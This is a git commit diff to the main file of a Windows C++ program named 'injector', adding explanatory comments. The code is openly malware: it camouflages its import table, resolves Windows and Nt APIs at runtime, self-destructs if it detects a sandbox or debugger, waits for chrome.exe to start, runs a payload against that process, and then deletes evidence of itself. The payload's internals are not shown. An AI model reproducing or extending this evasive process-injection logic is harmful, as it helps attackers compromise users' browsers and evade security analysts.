b04b7e5a94519cfe1b56f58611f5bd33ea0aea32
scott <scoybanister@me.com>
2024-04-12 03:05:10 -0600

    added comments

--- injector/src/main.cpp
+++ injector/src/main.cpp
@@ -1,4 +1,3 @@
-
 #include "Windows.h"
 #include "API/headers/api.h"
 #include "utils/headers/antianalysis.h"
@@ -23,37 +22,36 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
 {
 	AntiAnalysis hide;
 	Tools		 tools;
+	DWORD		 process = 0; 
 
-	auto& resolver = API::APIResolver::GetInstance();
+	API::APIResolver &resolver = API::APIResolver::GetInstance(); // Get instance of the API resolver
 
-	resolver.IATCamo();
-	resolver.LoadModules();
-	resolver.ResolveFunctions();
+	resolver.IATCamo();		// Camouflage the import address table
+	resolver.LoadModules(); // Get handles to necessary dlls
+	resolver.ResolveAPI();  // Resolve Win/Nt api functions 
 
-	auto api	  = resolver.GetAPIAccess();
+	auto api	  = resolver.GetAPIAccess();  // retrieve function pointers
 	
-	//hide.DelayExecution(5, resolver); // wait 5 minutes before execution
+	//hide.DelayExecution(5, resolver);				      // wait 5 minutes before execution
 
-	
-	DWORD process = 0; 
 
 	do
 	{
-		hide.IsBeingWatched(resolver); // Nuke self if in sandbox or debugger
-		process = tools.GetPID("chrome.exe"); // Check if chrome is running
+		hide.IsBeingWatched(resolver);				  // Nuke self if in sandbox or debugger
+		process = tools.GetPID("chrome.exe");	  // Check if target process is running
 
 		if (process != 0)
 		{
-			hide.DelayExecution(0.05, resolver);
+			hide.DelayExecution(0.05, resolver); // Wait a bit before executing payload
 			break;
 		}
 
-		hide.DelayExecution(0.1, resolver); // This should be every couple of minutes
+		hide.DelayExecution(0.1, resolver);		 // Check for process startup every few minutes
 	} while (process == 0);
 
-	Payload(process, api, TARGET_DLL, TARGET_FUNC);
+	Payload(process, api, TARGET_DLL, TARGET_FUNC);		 // Run the payload
 	
-	hide.Nuke(resolver);
+	hide.Nuke(resolver);								 // Remove evidence
 	return 0;
 } 
 
